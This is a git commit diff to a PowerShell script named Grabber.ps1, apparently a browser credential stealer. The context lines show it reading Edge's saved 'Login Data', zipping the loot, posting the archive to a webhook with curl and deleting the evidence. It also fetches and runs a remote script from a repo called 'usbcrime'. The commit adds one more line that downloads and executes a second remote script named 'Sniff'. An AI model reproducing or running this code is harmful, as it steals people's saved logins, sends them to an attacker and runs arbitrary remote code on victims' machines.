87d845302862d9fe58933aba50f3f21d6b0843a7
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-13 14:21:46 +0700

    Update Grabber.ps1

--- Grabber.ps1
+++ Grabber.ps1
@@ -366,5 +366,6 @@ if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {
 compress-archive -path "$outpath" -destinationpath "$outpath.zip" -force
 curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\", \"avatar_url\": \"https://cdn.pixabay.com/animation/2023/09/07/21/54/21-54-00-174_512.gif\"}' -F "file=@$env:temp\B1555.005.zip" $hookurl
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/usbcrime/main/temp.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
 Sleep 10
 Remove-Item -Path $outpath -Recurse -Force
